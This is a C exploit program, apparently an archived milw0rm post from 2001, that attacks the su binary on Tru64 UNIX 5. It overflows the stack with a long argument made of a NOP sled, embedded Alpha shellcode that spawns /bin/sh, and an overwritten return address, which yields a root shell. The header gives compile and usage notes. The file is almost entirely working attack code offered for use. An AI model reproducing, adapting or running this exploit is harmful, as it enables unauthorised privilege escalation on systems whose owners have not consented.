/*      Copyright (c) 2000 ADM                                  */
/*      All Rights Reserved                                     */
/*      THIS IS UNPUBLISHED PROPRIETARY SOURCE CODE OF ADM      */
/*      The copyright notice above does not evidence any        */
/*      actual or intended publication of such source code.     */
/*                                                              */
/*      Title:        Tru64 5 su                                */
/*      Tested under: Tru64 5A  (OSF/1)                         */
/*      By:           K2  (thx horizon,lamont :)                */
/*      Use:          cc -o tru64-su tru64-su.c                 */
/*      Issues:       Tru64 re-implmented non-exec patch,       */
/*                    I'm working on non-exec alpha technique   */
/*                    so it will only work if,                  */
/*                    do this -> "sysconfig -q proc executable_stack" */
/*                    and see if -> "executable_stack = 1"      */
/*                    else?                                     */
/*                    wait for new alpha non-exec stack exploit */
/*                                                              */


#include <unistd.h>
#include <stdlib.h>
#include <strings.h>
#include <string.h>
#include <stdio.h>

#define BUFSIZE 8241
char *nop                               = "\x1f\x04\xff\x47";
char *retaddr                   = "\xe4\xc0\xff\x1f\x01\x00\x00\x00";

/* lamont's shellcode */

int rawcode[] = {
  0x2230fec4,              /* subq $16,0x13c,$17 [2000]*/
  0x47ff0412,              /* clr $18            [2000]*/
  0x42509532,              /* subq $18, 0x84     [2000]*/
  0x239fffff,              /* xor $18, 0xffffffff, $18 */
  0x4b84169c,
  0x465c0812,
  0xb2510134,              /* stl $18, 0x134($17)[2000]*/
  0x265cff98,              /* lda $18, 0xff978cd0[2000]*/
  0x22528cd1,
  0x465c0812,              /* xor $18, 0xffffffff, $18 */
  0xb2510140,              /* stl $18, 0x140($17)[2000]*/
  0xb6110148,              /* stq $16,0x148($17) [2000]*/
  0xb7f10150,              /* stq $31,0x150($17) [2000]*/
  0x22310148,              /* addq $17,0x148,$17 [2000]*/
  0x225f013a,              /* ldil $18,0x13a     [2000]*/
  0x425ff520,              /* subq $18,0xff,$0   [2000]*/
  0x47ff0412,              /* clr $18            [2000]*/
  0xffffffff,              /* call_pal 0x83      [2000]*/
  0xd21fffed,              /* bsr $16,$l1    ENTRY     */
  0x6e69622f,              /* .ascii "/bin"      [2000]*/
  /* .ascii "/sh\0" is generated */
};

int main(int argc, char **argv)
{
  char buf[BUFSIZE+4];
  char *env[2];
  char *cp,*rc;
  int i;

  if(argc > 1) retaddr[0]+=atoi(argv[1]);

  memset(&buf,'A',BUFSIZE-8);
  cp=(char *) &(buf[BUFSIZE-8]);

  for (i=0;i<8;i++)
    *cp++=retaddr[i];

  rc=(char *)rawcode;
  cp=buf;

  for(i=0;i<8;i++)
    *cp++ = 0x6e;

  for(i=0;i<72;i++)
    *cp++ = rc[i];
  for(i=0;i<320;i++)
    *cp++ = nop[i % 4];
  *cp++=rc[72]-80;
  for(i=1;i<8;i++)
    *cp++ = rc[i+72];

  env[1]=NULL;

  execle("/usr/bin/su","su",buf, NULL,env);
  return(0);
}


// milw0rm.com [2001-01-26]